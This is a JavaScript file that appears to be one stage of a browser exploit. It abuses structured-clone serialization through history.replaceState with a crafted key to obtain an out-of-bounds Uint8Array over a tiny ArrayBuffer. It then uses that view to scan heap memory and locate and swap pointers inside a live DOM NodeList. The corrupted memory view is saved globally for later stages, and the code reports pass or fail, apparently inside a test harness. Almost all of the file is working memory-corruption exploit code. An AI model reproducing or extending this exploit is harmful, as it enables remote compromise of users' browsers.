// Locate a live retained Element list by reversible valid-pointer swaps.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var n = 3; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("live_search_stored");
  phase = "load";
  var output = history.state;
  mark("live_search_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 65536;
  var first = -1;
  var changed = 0;
  var listLength = null;
  var candidates = [];
  var tested = 0;
  var winner = -1;
  var restored = null;
  var candidateOffsets = [];
  if (valid) {
    phase = "map";
    var mapLimit = 266240;
    var baseline = new Uint8Array(mapLimit);
    for (var b = 0; b < mapLimit; b++) baseline[b] = synthetic[b];
    cloned.fill(0xc4);
    for (var q = 0; q < mapLimit; q++) {
      if (synthetic[q] !== baseline[q]) {
        if (first < 0) first = q;
        changed++;
      }
    }
    if (first >= 0 && first + 65536 > mapLimit)
      for (var tail = mapLimit; tail < first + 65536; tail++)
        if (synthetic[tail] === 0xc4) changed++;
    cloned.fill(0x91);
    mark("live_search_mapped");
    if (changed === 65536 && first >= 0) {
      phase = "make_list";
      var root = document.createElement("div");
      var fragment = document.createDocumentFragment();
      for (var d = 0; d < 8191; d++)
        fragment.appendChild(document.createElement("span"));
      root.appendChild(fragment);
      mark("live_search_dom_ready");
      structuredClone(0, { transfer: [output.filler[2]] });
      mark("live_search_detached");
      var list = root.querySelectorAll("span");
      listLength = list.length;
      var firstNode = list.item(0);
      var secondNode = list.item(1);
      mark("live_search_list_ready");
      function low(at) {
        return (synthetic[at] | synthetic[at + 1] << 8 |
          synthetic[at + 2] << 16 | synthetic[at + 3] << 24) >>> 0;
      }
      function high(at) {
        return (synthetic[at + 4] | synthetic[at + 5] << 8 |
          synthetic[at + 6] << 16 | synthetic[at + 7] << 24) >>> 0;
      }
      phase = "scan";
      var inRun = false;
      var regionCounts = [0, 0, 0, 0, 0, 0, 0, 0];
      for (var off = 0; off <= 524288 - 32; off += 8) {
        if (off >= first && off < first + 65536) {
          inRun = false;
          continue;
        }
        var base = low(off);
        var matching = high(off) === 2 && (base & 15) === 0;
        if (matching) {
          for (var p = 1; p < 4; p++) {
            if (high(off + 8 * p) !== 2 || low(off + 8 * p) !== base + 0x70 * p) {
              matching = false;
              break;
            }
          }
        }
        if (matching && !inRun) {
          var region = Math.floor(off / 65536);
          if (regionCounts[region] < 8) {
            candidates.push(off);
            regionCounts[region]++;
          }
        }
        inRun = matching;
      }
      mark("live_search_scan_done");
      phase = "test_candidates";
      if (listLength === 8191 && firstNode !== secondNode) {
        for (var c = 0; c < candidates.length; c++) {
          var at = candidates[c];
          var old = [];
          for (var z = 0; z < 16; z++) old.push(synthetic[at + z]);
          var changedList = false;
          try {
            for (var w = 0; w < 8; w++) synthetic[at + w] = old[8 + w];
            changedList = list.item(0) === secondNode;
          } finally {
            for (var x = 0; x < 8; x++) synthetic[at + x] = old[x];
          }
          tested++;
          if (changedList) {
            restored = list.item(0) === firstNode;
            winner = at;
            if (restored) window.__fw14NodeState = {
              view: synthetic, index: at, elementBytes: old.slice(0, 8),
              list: list, firstNode: firstNode, secondNode: secondNode, root: root
            };
            break;
          }
        }
      }
      candidateOffsets = candidates.slice(0, 16);
      mark("live_search_restored");
    }
  }
  result = { id: "live_list_search", status: winner >= 0 && restored ? "pass" : "fail", details: {
    view_valid: valid, first_index: first, changed_bytes: changed,
    list_length: listLength, candidate_count: candidates.length,
    candidate_offsets: candidateOffsets.join(","), tested_count: tested,
    winner_index: winner, restored: restored, target_first: new Uint8Array(target)[0]
  } };
} catch (error) {
  result = { id: "live_list_search", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
